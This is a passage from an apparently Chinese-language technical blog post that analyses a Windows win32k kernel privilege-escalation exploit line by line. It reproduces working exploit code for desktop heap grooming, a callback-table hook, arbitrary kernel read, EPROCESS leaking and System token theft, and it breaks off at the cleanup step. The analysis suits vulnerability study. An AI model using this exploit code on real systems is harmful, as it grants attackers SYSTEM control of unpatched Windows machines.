行注册了两个窗口类，两个窗口类的主要区别是 cbWndExtra 的大小：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">ATOM atom1, atom2 = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">WNDCLASSEX WndClass = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">WndClass.cbSize = <span class="built_in"><span class="keyword">sizeof</span></span>(WNDCLASSEX);</span><br><span class="line">WndClass.lpfnWndProc = DefWindowProc;<span class="comment">// 使用默认窗口过程</span></span><br><span class="line">WndClass.style = CS_VREDRAW| CS_HREDRAW;</span><br><span class="line">WndClass.cbWndExtra = <span class="number">0x20</span>;<span class="comment">// Class1 窗口扩展内存的大小为 0x20</span></span><br><span class="line">WndClass.hInstance = hInstance;</span><br><span class="line">WndClass.lpszMenuName = <span class="literal">NULL</span>;</span><br><span class="line">WndClass.lpszClassName = <span class="string">L&quot;Class1&quot;</span>;<span class="comment">// 窗口类名为 Class1</span></span><br><span class="line">atom1 = <span class="built_in">RegisterClassEx</span>(&amp;WndClass); <span class="comment">// 注册 Class1</span></span><br><span class="line"></span><br><span class="line">WndClass.cbWndExtra = g_dwMyWndExtra;<span class="comment">// Class2 窗口扩展内存的大小为 0x1234</span></span><br><span class="line">WndClass.hInstance = hInstance;</span><br><span class="line">WndClass.lpszClassName = <span class="string">L&quot;Class2&quot;</span>;<span class="comment">// 窗口类名为 Class2</span></span><br><span class="line">atom2 = <span class="built_in">RegisterClassEx</span>(&amp;WndClass);<span class="comment">// 注册 Class2</span></span><br></pre></td></tr></table></figure><p>223 - 287 行通过创建/销毁窗口，正式进行内核桌面堆布局：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">ULONG_PTR dwpWnd0_to_pWnd1_kernel_heap_offset = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> nTry = <span class="number">0</span>; nTry &lt; <span class="number">5</span>; nTry++) &#123;<span class="comment">// 最多尝试 5 次内存布局</span></span><br><span class="line">    HMENU hMenu = <span class="literal">NULL</span>;</span><br><span class="line">    HMENU hHelpMenu = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="comment">// 创建 50 个窗口</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">50</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (i == <span class="number">1</span>) &#123;<span class="comment">// i = 1 时创建一个菜单 hMenu</span></span><br><span class="line">            hMenu = <span class="built_in">CreateMenu</span>();</span><br><span class="line">            hHelpMenu = <span class="built_in">CreateMenu</span>();</span><br><span class="line"></span><br><span class="line">            <span class="built_in">AppendMenu</span>(hHelpMenu, MF_STRING, <span class="number">0x1888</span>, <span class="built_in">TEXT</span>(<span class="string">&quot;about&quot;</span>));<span class="comment">// 准备一个 Item</span></span><br><span class="line">            <span class="built_in">AppendMenu</span>(hMenu, MF_POPUP, (LONG)hHelpMenu, <span class="built_in">TEXT</span>(<span class="string">&quot;help&quot;</span>));<span class="comment">// 为菜单添加 Item</span></span><br><span class="line">        &#125;</span><br><span class="line">        g_hWnd[i] = <span class="built_in">CreateWindowEx</span>(<span class="literal">NULL</span>, <span class="string">L&quot;Class1&quot;</span>, <span class="literal">NULL</span>, WS_VISIBLE, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="literal">NULL</span>, hMenu, hInstance, <span class="literal">NULL</span>);<span class="comment">// 创建窗口，只有窗口 0 没有菜单</span></span><br><span class="line">        g_pWnd[i] = (ULONG_PTR)<span class="built_in">fHMValidateHandle</span>(g_hWnd[i], <span class="number">1</span>); <span class="comment">// 泄露每个窗口 tagWNDk 在用户空间的映射指针</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 销毁掉后 48 个窗口，使它们 tagWNDk 占用的桌面堆块处于空闲状态，再创建窗口时很有可能再用到这些空闲的堆块</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">2</span>; i &lt; <span class="number">50</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (g_hWnd[i] != <span class="literal">NULL</span>) &#123;</span><br><span class="line">            <span class="built_in">DestroyWindow</span>((HWND)g_hWnd[i]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// ptagWNDk + 8 保存了 tagWNDk 相对于桌面堆基址的偏移</span></span><br><span class="line">    g_dwpWndKernel_heap_offset0 = *(ULONG_PTR*)((PBYTE)g_pWnd[<span class="number">0</span>] + g_dwKernel_pWnd_offset);</span><br><span class="line">    g_dwpWndKernel_heap_offset1 = *(ULONG_PTR*)((PBYTE)g_pWnd[<span class="number">1</span>] + g_dwKernel_pWnd_offset);</span><br><span class="line">    <span class="comment">// 对窗口 0 调用 ConsoleControl，使其 pExtraBytes 处于 offset 间接寻址模式</span></span><br><span class="line">    ULONG_PTR ChangeOffset = <span class="number">0</span>;</span><br><span class="line">    ULONG_PTR ConsoleCtrlInfo[<span class="number">2</span>] = &#123; <span class="number">0</span> &#125;;<span class="comment">// 参数长度为 0x10 字节</span></span><br><span class="line">    ConsoleCtrlInfo[<span class="number">0</span>] = (ULONG_PTR)g_hWnd[<span class="number">0</span>];<span class="comment">// 参数信息的第一个 8 字节存放窗口句柄</span></span><br><span class="line">    ConsoleCtrlInfo[<span class="number">1</span>] = (ULONG_PTR)ChangeOffset;<span class="comment">// 第二个 8 字节对利用没有影响</span></span><br><span class="line">    NTSTATUS ret1 = <span class="built_in">g_fNtUserConsoleControl</span>(<span class="number">6</span>, (ULONG_PTR)&amp;ConsoleCtrlInfo, <span class="built_in"><span class="keyword">sizeof</span></span>(ConsoleCtrlInfo));<span class="comment">// 功能 6</span></span><br><span class="line">    <span class="comment">// 现在窗口 0 重新在桌面堆申请了一片空间作为扩展内存，pExtraBytes 存储其相对于桌面堆基址的偏移</span></span><br><span class="line">    dwpWnd0_to_pWnd1_kernel_heap_offset = *(ULONGLONG*)((PBYTE)g_pWnd[<span class="number">0</span>] + <span class="number">0x128</span>);</span><br><span class="line">    <span class="keyword">if</span> (dwpWnd0_to_pWnd1_kernel_heap_offset &lt; g_dwpWndKernel_heap_offset1) &#123;<span class="comment">// 需要保证这片新空间地址小于窗口 1 tagWNDk 结构体所在的地址，这样才能通过窗口 0 扩展内存越界修改 tagWNDk1</span></span><br><span class="line">        dwpWnd0_to_pWnd1_kernel_heap_offset = (g_dwpWndKernel_heap_offset1 - dwpWnd0_to_pWnd1_kernel_heap_offset);<span class="comment">// 记下它们之间的偏移</span></span><br><span class="line">        <span class="keyword">break</span>;<span class="comment">// 退出循环</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 如果进了 else，说明这次内存布局失败，回收所有资源</span></span><br><span class="line">        <span class="keyword">if</span> (g_hWnd[<span class="number">0</span>] != <span class="literal">NULL</span>) &#123;</span><br><span class="line">            <span class="built_in">DestroyWindow</span>((HWND)g_hWnd[<span class="number">0</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (g_hWnd[<span class="number">1</span>] != <span class="literal">NULL</span>) &#123;</span><br><span class="line">            <span class="built_in">DestroyWindow</span>((HWND)g_hWnd[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (hMenu != <span class="literal">NULL</span>) &#123;</span><br><span class="line">                <span class="built_in">DestroyMenu</span>(hMenu);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (hHelpMenu != <span class="literal">NULL</span>) &#123;</span><br><span class="line">                <span class="built_in">DestroyMenu</span>(hHelpMenu);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    dwpWnd0_to_pWnd1_kernel_heap_offset = <span class="number">0</span>;<span class="comment">// 重新设置该变量值为 0，进入下次内存布局尝试</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (dwpWnd0_to_pWnd1_kernel_heap_offset == <span class="number">0</span>) &#123;<span class="comment">// 5 次尝试都失败了，退出程序</span></span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;Memory layout fail. quit&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">    <span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 创建窗口 2，期间调用 hook 函数时，会将 pExtraBytes 改为 offset 间接寻址模式，并赋值为 tagWNDk0 相对于桌面堆基址的偏移</span></span><br><span class="line">HWND hWnd2 = <span class="built_in">CreateWindowEx</span>(<span class="literal">NULL</span>, <span class="string">L&quot;Class2&quot;</span>, <span class="literal">NULL</span>, WS_VISIBLE, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, hInstance, <span class="literal">NULL</span>);</span><br><span class="line">PVOID pWnd2 = <span class="built_in">fHMValidateHandle</span>(hWnd2, <span class="number">1</span>);<span class="comment">// 泄露 tagWNDk2 在用户空间的映射指针</span></span><br></pre></td></tr></table></figure><p>KernelCallbackTable 的 123 项之前被替换成自定义的 hook 函数：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">NTSTATUS WINAPI <span class="title">MyxxxClientAllocWindowClassExtraBytes</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span>* pSize)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (*pSize == g_dwMyWndExtra) &#123;<span class="comment">// 只有参数为 0x1234 时，才进行操作。即只有 286 行创建 Class2 的窗口时才会进到这里</span></span><br><span class="line">        ULONG_PTR ululValue = <span class="number">0</span>;</span><br><span class="line">        HWND hWnd2 = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 搜索释放掉的后 48 个窗口对应的 tagWNDk，寻找新窗口的 tagWNDk 复用了哪个地址（这里应该是 i &lt; 50，不过无伤大雅）</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">2</span>; i &lt; <span class="number">48</span>; i++) &#123;</span><br><span class="line">            ULONG_PTR cbWndExtra = *(ULONG_PTR*)(g_pWnd[i] + g_cbWndExtra_offset);<span class="comment">// 取来每个 cbWndExtra</span></span><br><span class="line">            <span class="keyword">if</span> (cbWndExtra == g_dwMyWndExtra) &#123;<span class="comment">// 找到新窗口的 tagWNDk</span></span><br><span class="line">                hWnd2 = (HWND)*(ULONG_PTR*)(g_pWnd[i]); <span class="comment">// &amp;tagWNDk + 0 存放窗口句柄</span></span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (hWnd2 == <span class="literal">NULL</span>) &#123;</span><br><span class="line">            <span class="comment">// 到这里说明新窗口 tagWNDk 没有复用之前的空间，则输出错误信息，这里再加个结束程序会好些</span></span><br><span class="line">            std::cout &lt;&lt; <span class="string">&quot;Search free 48 kernel mapping desktop heap (cbwndextra == g_dwMyWndExtra) points to hWnd fail.&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            std::cout &lt;&lt; <span class="string">&quot;Search kernel mapping desktop heap points to hWnd: &quot;</span> &lt;&lt; std::hex &lt;&lt; hWnd2 &lt;&lt; std::endl;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 对新窗口（窗口 2）调用 ConsoleControl，使其 pExtraBytes 处于 offset 间接寻址模式</span></span><br><span class="line">        ULONG_PTR ConsoleCtrlInfo[<span class="number">2</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">        ConsoleCtrlInfo[<span class="number">0</span>] = (ULONG_PTR)hWnd2;<span class="comment">// 第一个 8 字节放窗口句柄</span></span><br><span class="line">        ConsoleCtrlInfo[<span class="number">1</span>] = ululValue;<span class="comment">// 0</span></span><br><span class="line">        NTSTATUS ret = <span class="built_in">g_fNtUserConsoleControl</span>(<span class="number">6</span>, (ULONG_PTR)&amp;ConsoleCtrlInfo, <span class="built_in"><span class="keyword">sizeof</span></span>(ConsoleCtrlInfo));</span><br><span class="line"></span><br><span class="line">        ULONG_PTR Result[<span class="number">3</span>] = &#123; <span class="number">0</span> &#125;;<span class="comment">// 返回信息长度为 0x18</span></span><br><span class="line">        Result[<span class="number">0</span>] = g_dwpWndKernel_heap_offset0;<span class="comment">// 第一个 8 字节会被用于赋值 pExtraBytes</span></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">g_fFNtCallbackReturn</span>(&amp;Result, <span class="built_in"><span class="keyword">sizeof</span></span>(Result), <span class="number">0</span>);<span class="comment">// tagWNDk2.pExtraBytes 语义上指向 tagWNDk0</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">g_fxxxClientAllocWindowClassExtraBytes</span>(pSize);<span class="comment">// 238 行创建 50 个 Class1 的窗口时，都直接调用原函数</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>至此布局完毕，桌面堆长这样：</p><p><img src="/img/article/20220104/exp_read/memory_layout/1.png" alt="1"></p><br><h3 id="任意地址读的实现及封装"><a href="#任意地址读的实现及封装" class="headerlink" title="任意地址读的实现及封装"></a>任意地址读的实现及封装</h3><p>289 - 306 行使得我们具有任意地址读的能力：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">SetWindowLong</span>(hWnd2, g_cbWndExtra_offset, <span class="number">0x0FFFFFFFF</span>);<span class="comment">// 将 tagWNDk0.cbWndExtra 改为很大的值，窗口 0 的扩展内存可以越界写</span></span><br><span class="line"><span class="comment">// 想要使用 SetWindowLongPtr 修改 spMenu 的功能（-12），tagWNDk.dwStyle 需要带有 WS_CHILD 属性</span></span><br><span class="line">ULONGLONG ululStyle = *(ULONGLONG*)((PBYTE)g_pWnd[<span class="number">1</span>] + g_dwExStyle_offset);</span><br><span class="line">ululStyle |= <span class="number">0x4000000000000000</span>L;</span><br><span class="line"><span class="built_in">SetWindowLongPtr</span>(g_hWnd[<span class="number">0</span>], dwpWnd0_to_pWnd1_kernel_heap_offset + g_dwExStyle_offset, ululStyle);  <span class="comment">// 对窗口 0 调用 SetWindowLongPtr，修改 tagWNDk1.dwStyle，使其带有 WS_CHILD</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 构造一个 tagMENU，参考 3.6.2 节</span></span><br><span class="line">g_pMyMenu = (ULONG_PTR)<span class="built_in">g_fRtlAllocateHeap</span>((PVOID) * (ULONG_PTR*)(__readgsqword(<span class="number">0x60</span>) + <span class="number">0x30</span>), <span class="number">0</span>, <span class="number">0xA0</span>);</span><br><span class="line">*(ULONG_PTR*)((PBYTE)g_pMyMenu + <span class="number">0x98</span>) = (ULONG_PTR)<span class="built_in">g_fRtlAllocateHeap</span>((PVOID) * (ULONG_PTR*)(__readgsqword(<span class="number">0x60</span>) + <span class="number">0x30</span>), <span class="number">0</span>, <span class="number">0x20</span>);<span class="comment">// spMenuk</span></span><br><span class="line">**(ULONG_PTR**)((PBYTE)g_pMyMenu + <span class="number">0x98</span>) = g_pMyMenu;<span class="comment">// spMenuk-&gt;pSelf</span></span><br><span class="line">*(ULONG_PTR*)((PBYTE)g_pMyMenu + <span class="number">0x28</span>) = (ULONG_PTR)<span class="built_in">g_fRtlAllocateHeap</span>((PVOID) * (ULONG_PTR*)(__readgsqword(<span class="number">0x60</span>) + <span class="number">0x30</span>), <span class="number">0</span>, <span class="number">0x200</span>);<span class="comment">// unknown1</span></span><br><span class="line">*(ULONG_PTR*)((PBYTE)g_pMyMenu + <span class="number">0x58</span>) = (ULONG_PTR)<span class="built_in">g_fRtlAllocateHeap</span>((PVOID) * (ULONG_PTR*)(__readgsqword(<span class="number">0x60</span>) + <span class="number">0x30</span>), <span class="number">0</span>, <span class="number">0x8</span>);<span class="comment">// rgItems</span></span><br><span class="line">*(ULONG_PTR*)(*(ULONG_PTR*)((PBYTE)g_pMyMenu + <span class="number">0x28</span>) + <span class="number">0x2C</span>) = <span class="number">1</span>;<span class="comment">// unknown1-&gt;cItems</span></span><br><span class="line">*(DWORD*)((PBYTE)g_pMyMenu + <span class="number">0x40</span>) = <span class="number">1</span>;<span class="comment">// unknown2</span></span><br><span class="line">*(DWORD*)((PBYTE)g_pMyMenu + <span class="number">0x44</span>) = <span class="number">2</span>;<span class="comment">// unknown3</span></span><br><span class="line">*(ULONG_PTR*)(*(ULONG_PTR*)((PBYTE)g_pMyMenu + <span class="number">0x58</span>)) = <span class="number">0x4141414141414141</span>;  <span class="comment">// rgItems-&gt;unknown，用到的时候再初始化 </span></span><br><span class="line"><span class="comment">// 修改窗口 1 的 spMenu，同时泄露原 spMenu</span></span><br><span class="line">ULONG_PTR pSPMenu = <span class="built_in">SetWindowLongPtr</span>(g_hWnd[<span class="number">1</span>], GWLP_ID, (LONG_PTR)g_pMyMenu);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 调用 GetMenuBarInfo 时，tagWNDk.dwStyle 不能包含 WS_CHILD</span></span><br><span class="line">ululStyle &amp;= ~<span class="number">0x4000000000000000</span>L;</span><br><span class="line"><span class="built_in">SetWindowLongPtr</span>(g_hWnd[<span class="number">0</span>], dwpWnd0_to_pWnd1_kernel_heap_offset + g_dwExStyle_offset, ululStyle);  <span class="comment">// 移除窗口 1 的 WS_CHILD 样式</span></span><br></pre></td></tr></table></figure><p>EXP 中通过函数 ReadKernelMemoryQQWORD 封装任意地址读功能，参数 pAddress 为要读的地址 p，ululOutVal1 和 ululOutVal2 存储读出来的 16 字节，其中 <code>ululOutVal1 = *(__int64 *)p</code>，<code>ululOutVal2 = *(__int64 *)(p + 8)</code>，实现如下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">ReadKernelMemoryQQWORD</span><span class="params">(ULONG_PTR pAddress, ULONG_PTR &amp;ululOutVal1, ULONG_PTR &amp;ululOutVal2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    MENUBARINFO mbi = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    mbi.cbSize = <span class="built_in"><span class="keyword">sizeof</span></span>(MENUBARINFO);</span><br><span class="line"></span><br><span class="line">    RECT Rect = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    <span class="built_in">GetWindowRect</span>(g_hWnd[<span class="number">1</span>], &amp;Rect);<span class="comment">// 获取窗口 1 的 RECT 信息，用于计算读出的真实值</span></span><br><span class="line"></span><br><span class="line">    *(ULONG_PTR*)(*(ULONG_PTR*)((PBYTE)g_pMyMenu + <span class="number">0x58</span>)) = pAddress - <span class="number">0x40</span>; <span class="comment">// rgItems-&gt;unknown</span></span><br><span class="line">    <span class="built_in">GetMenuBarInfo</span>(g_hWnd[<span class="number">1</span>], <span class="number">-3</span>, <span class="number">1</span>, &amp;mbi);<span class="comment">// 读取</span></span><br><span class="line"></span><br><span class="line">    BYTE pbKernelValue[<span class="number">16</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    *(DWORD*)(pbKernelValue) = mbi.rcBar.left - Rect.left;<span class="comment">// 减去 Rect.left，创建窗口时，该值被指定为 0</span></span><br><span class="line">    *(DWORD*)(pbKernelValue + <span class="number">4</span>) = mbi.rcBar.top - Rect.top;<span class="comment">// 减去 Rect.top，创建窗口时，该值被指定为 0</span></span><br><span class="line">    *(DWORD*)(pbKernelValue + <span class="number">8</span>) = mbi.rcBar.right - mbi.rcBar.left;</span><br><span class="line">    *(DWORD*)(pbKernelValue + <span class="number">0xc</span>) = mbi.rcBar.bottom - mbi.rcBar.top;</span><br><span class="line"></span><br><span class="line">    ululOutVal1 = *(ULONG_PTR*)(pbKernelValue);<span class="comment">// 成功读出 pAddress 开始的 16 字节</span></span><br><span class="line">    ululOutVal2 = *(ULONG_PTR*)(pbKernelValue + <span class="number">8</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>至于为什么要减去那四个值，再来回顾一下 xxxGetMenuBarInfo 中是怎么赋值 mbi 的：</p><p><img src="/img/article/20220104/exp_read/wrap_read_function/1.png" alt="1"></p><br><h3 id="泄露进程-EPROCESS-地址"><a href="#泄露进程-EPROCESS-地址" class="headerlink" title="泄露进程 EPROCESS 地址"></a>泄露进程 EPROCESS 地址</h3><p>312 - 320 行使用了 <strong>3.6.3 节</strong> 第一种方法来泄露：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">ULONG_PTR ululValue1 = <span class="number">0</span>, ululValue2 = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// **(__int64 **)(*(__int64 *)(spMenu + 0x18) + 0x100) 为进程 EPROCESS 结构体地址</span></span><br><span class="line"><span class="built_in">ReadKernelMemoryQQWORD</span>(pSPMenu + <span class="number">0x18</span>, ululValue1, ululValue2);</span><br><span class="line"><span class="built_in">ReadKernelMemoryQQWORD</span>(ululValue1 + <span class="number">0x100</span>, ululValue1, ululValue2);</span><br><span class="line"><span class="built_in">ReadKernelMemoryQQWORD</span>(ululValue1, ululValue1, ululValue2);</span><br><span class="line"></span><br><span class="line">ULONG_PTR pMyEProcess = ululValue1;</span><br><span class="line">std::cout&lt;&lt; <span class="string">&quot;Get current kernel eprocess: &quot;</span> &lt;&lt; pMyEProcess &lt;&lt; std::endl;<span class="comment">// 输出 EPROCESS 地址到控制台</span></span><br></pre></td></tr></table></figure><br><h3 id="进程权限提升"><a href="#进程权限提升" class="headerlink" title="进程权限提升"></a>进程权限提升</h3><p>322 - 347 行遍历 EPROCESS-&gt;ActiveProcessLinks 链表，找到 System 进程，将其 Token 复制到当前进程：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">ULONG_PTR pSystemEProcess = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">ULONG_PTR pNextEProcess = pMyEProcess;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">500</span>; i++) &#123;<span class="comment">// 用 do...whlie 循环遍历更优</span></span><br><span class="line">    <span class="built_in">ReadKernelMemoryQQWORD</span>(pNextEProcess + g_dwEPROCESS_ActiveProcessLinks_offset, ululValue1, ululValue2);<span class="comment">// 读出 pEPROCESS-&gt;ActiveProcessLinks.Flink 的值</span></span><br><span class="line">    pNextEProcess = ululValue1 - g_dwEPROCESS_ActiveProcessLinks_offset;<span class="comment">// 减去 ActiveProcessLinks 字段在 EPROCESS 结构体中的偏移，得到下一个进程 EPROCESS 结构体首地址</span></span><br><span class="line">    <span class="comment">// 读取下一个进程 pid</span></span><br><span class="line">    <span class="built_in">ReadKernelMemoryQQWORD</span>(pNextEProcess + g_dwEPROCESS_UniqueProcessId_offset, ululValue1, ululValue2);</span><br><span class="line"></span><br><span class="line">    ULONG_PTR nProcessId = ululValue1;</span><br><span class="line">    <span class="keyword">if</span> (nProcessId == <span class="number">4</span>) &#123; <span class="comment">// pid 为 4，说明找到了 System 进程</span></span><br><span class="line">        pSystemEProcess = pNextEProcess;</span><br><span class="line">        std::cout &lt;&lt; <span class="string">&quot;System kernel eprocess: &quot;</span> &lt;&lt; std::hex &lt;&lt; pSystemEProcess &lt;&lt; std::endl;<span class="comment">// 输出信息</span></span><br><span class="line">        <span class="comment">// 读取 System 进程的 Token</span></span><br><span class="line">        <span class="built_in">ReadKernelMemoryQQWORD</span>(pSystemEProcess + g_dwEPROCESS_Token_offset, ululValue1, ululValue2);</span><br><span class="line">        ULONG_PTR pSystemToken = ululValue1;</span><br><span class="line"></span><br><span class="line">        ULONG_PTR pMyEProcessToken = pMyEProcess + g_dwEPROCESS_Token_offset;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 参考 3.6.1 节，通过任意地址写，替换当前进程的 Token 为 System Token</span></span><br><span class="line">        LONG_PTR old = <span class="built_in">SetWindowLongPtr</span>(g_hWnd[<span class="number">0</span>], dwpWnd0_to_pWnd1_kernel_heap_offset + g_dwModifyOffset_offset, (LONG_PTR)pMyEProcessToken);<span class="comment">// 修改 tagWNDk1.pExtraBytes 为当前进程 &amp;pEPROCESS-&gt;Token</span></span><br><span class="line">        <span class="built_in">SetWindowLongPtr</span>(g_hWnd[<span class="number">1</span>], <span class="number">0</span>, (LONG_PTR)pSystemToken);  <span class="comment">// 窗口 1 的 pExtraBytes 处于直接寻址模式</span></span><br><span class="line">        <span class="built_in">SetWindowLongPtr</span>(g_hWnd[<span class="number">0</span>], dwpWnd0_to_pWnd1_kernel_heap_offset + g_dwModifyOffset_offset, (LONG_PTR)old);<span class="comment">// 还原 tagWNDk1.pExtraBytes 旧值</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br><h3 id="扫尾工作"><a href="#扫尾工作" class="headerlink" title="扫尾工作"></a>扫尾工作</h3><p>350 - 374 行恢复了被修改的各结构体字段，防止蓝屏的发生：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 